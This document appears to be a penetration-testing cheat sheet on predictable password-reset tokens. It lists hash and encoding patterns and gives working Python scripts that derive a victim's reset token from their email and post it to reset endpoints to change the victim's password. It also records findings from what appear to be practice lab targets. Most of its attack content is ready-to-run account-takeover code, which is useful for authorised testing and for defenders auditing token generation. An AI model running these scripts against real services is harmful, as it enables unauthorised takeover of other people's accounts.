# Predictable Token Patterns

## When to Use
- Forgot password / email verification / account activation flows
- Any endpoint accepting a "token" or "hash" parameter
- Password reset returns "Token expired" (confirms token validation exists)

## Common Predictable Token Patterns

### SHA-512 of Email (SecOps June 2026)
- **Pattern:** Reset token = SHA-512(email_address), 128 hex chars
- **Detection:** Token length 128 hex = 512 bits. Generate `echo -n "victim@domain.com" | sha512sum` and compare.
- **PoC URL pattern:** `https://target.com/index?hash=<sha512_of_email>`
- **Password change:** POST /login with `change_password=X&change_con_password=X&hash=<sha512>`
- **Impact:** Critical ATO — any user's password reset knowing only their email
- **Note:** Forgot-password response confirmed user existence ("Check your inbox") but login said "User not Found" until password was actually changed via the predictable hash.

| Pattern | Example | Detection |
|---------|---------|-----------|
| SHA-512(email) | `sha512("user@example.com")` | 128 hex chars, compute and compare |
| MD5(email) | `md5("user@example.com")` | Compute and test |
| MD5(username) | `md5("admin")` | Compute and test |
| MD5(user_id) | `md5("1")`, `md5("2")` | Iterate IDs |
| SHA1(email) | `sha1("user@example.com")` | Compute and test |
| SHA256(email) | Less common but check | Compute and test |
| SHA512(email) | 128 hex chars | Compute and test — SecOps June 2026 |
| MD5(email+salt) | `md5("user@example.com" + "secret")` | Need source/leak |
| Base64(email) | `base64("user@example.com")` | Decode any token you receive |
| Base64(JSON) | `base64('{"email":"x","ts":123}')` | Decode, modify, re-encode |
| Timestamp | Unix epoch at reset time | Brute-force ±60 seconds |
| Sequential int | 1001, 1002, 1003... | IDOR on token parameter |
| UUID v1 | Time-based UUID | Extract timestamp, predict next |
| MD5(timestamp) | `md5("1718409600")` | Brute-force ±window |

## Testing Methodology

### Step 1: Trigger reset for YOUR account
```python
# Trigger forgot password for your own email
r = s.post(f"{BASE}/forgot", data={"email": MY_EMAIL})
# Check inbox for the reset link/token
# Extract the token value
```

### Step 2: Analyze the token
```python
import hashlib, base64

token = "ec88280206f8db436475ae83934c7a18"  # from reset email

# Test known patterns
checks = {
    "MD5(email)": hashlib.md5(MY_EMAIL.encode()).hexdigest(),
    "MD5(username)": hashlib.md5(MY_USERNAME.encode()).hexdigest(),
    "SHA1(email)": hashlib.sha1(MY_EMAIL.encode()).hexdigest(),
    "SHA256(email)": hashlib.sha256(MY_EMAIL.encode()).hexdigest(),
    "SHA512(email)": hashlib.sha512(MY_EMAIL.encode()).hexdigest(),
    "Base64": base64.b64decode(token + "==").decode(errors="replace"),
}

for name, computed in checks.items():
    if computed == token:
        print(f"[+] TOKEN IS: {name}")
        break
```

**Token length quick-reference:**
- 32 hex = MD5, 40 hex = SHA1, 64 hex = SHA256, **128 hex = SHA512**

### Step 3: If no email access, test directly
```python
# If you can't see your own reset token, brute-force the pattern
import hashlib

target_email = "victim@example.com"
candidates = [
    hashlib.md5(target_email.encode()).hexdigest(),
    hashlib.sha1(target_email.encode()).hexdigest(),
    hashlib.md5(target_email.split("@")[0].encode()).hexdigest(),
]

for token in candidates:
    r = s.post(f"{BASE}/reset", data={
        "hash": token,
        "password": "NewPass123",
        "confirm": "NewPass123"
    })
    if "success" in r.text.lower() or "updated" in r.text.lower():
        print(f"[+] VALID TOKEN: {token}")
        break
    elif "expired" in r.text.lower():
        print(f"[-] Token format correct but expired: {token}")
        # May need to trigger forgot first, then use immediately
```

### Step 4: Trigger + use in same session
Some apps only validate the token within a short window after forgot is triggered:
```python
# Trigger forgot for victim
s.post(f"{BASE}/forgot", data={"email": VICTIM_EMAIL})

# Immediately use the predictable token
token = hashlib.md5(VICTIM_EMAIL.encode()).hexdigest()
r = s.post(f"{BASE}/reset", data={"hash": token, "password": "Pwned123", "confirm": "Pwned123"})
```

## Real-World Examples

### mock.hackme.secops.group (June 2026)
- Token: MD5 of email address
- No trigger required — token works anytime
- Change password endpoint: POST /login with hash=<md5>&change_password=<new>

### hackme1.secops.group (June 2026)
- Token: SHA-512 of email address (128 hex chars)
- Must trigger forgot password first (POST /login with forgot_email=victim@x.com)
- Then immediately use: POST /login with hash=<sha512>&change_password=<new>&change_con_password=<new>
- User enumeration via subtle whitespace diff in forgot response ("reset your password" vs "reset  your password")
- Same /login endpoint handles login, forgot, AND password change (action determined by param presence)
- Lesson: when token is 128 hex chars, ALWAYS test SHA512(email) immediately — don't waste time on IDOR/Host-header approaches

## Indicators of Predictable Tokens
- Token is exactly 32 hex chars (MD5)
- Token is exactly 40 hex chars (SHA1)
- Token is exactly 64 hex chars (SHA256)
- Token changes predictably when email changes
- Multiple resets for same user produce same token (not randomized)
- Token doesn't expire (or very long expiry)
- No rate limiting on the reset endpoint
